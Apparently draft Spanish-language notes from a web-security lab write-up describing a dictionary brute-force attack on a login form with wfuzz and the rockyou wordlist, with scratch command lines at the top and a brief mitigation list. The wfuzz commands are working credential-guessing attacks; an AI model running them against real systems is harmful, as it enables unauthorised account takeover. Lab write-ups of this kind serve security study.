wfuzz -w rockyou.txt "http://192.168.1.66/index.php?page=signin&username=admin&password=FUZZ&Login=Login#"

curl https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -L -o rockyou.txt

1988 hh

es shadow

# Brute Force Attack

Un **ataque de fuerza bruta** es un ataque que implica el craqueo de credenciales o contraseñas por uso de prueba y error.

Estos ataques pueden ser completamente manuales o automatizados mediante el uso de diccionarios de credenciales o usuarios (**dictionary attack**).

## Ataque

- **Localización**: http://<IP>/index.php?page=singin

Tenemos un formulario para ingresar unas credenciales y loguearse en la página. Hacemos las pruebas necesarias para ver si hay algún error de sanitización de input de usuario, como una [inyección SQL](./sql_injection_users.md). 

Tras ver que el iput está sanitizado, probamos con un ataque de fuerza bruta mediante un diccionario, el cual podemos automatizar con **wfuzz** ya que las credenciales se pasan por query:

```bash
wfuzz --hh 1988 -w rockyou.txt "http://<IP>/index.php?page=signin&username=admin&password=FUZZ&Login=Login#"
```



## Mitigación

- rate limit
- logs

## Referencias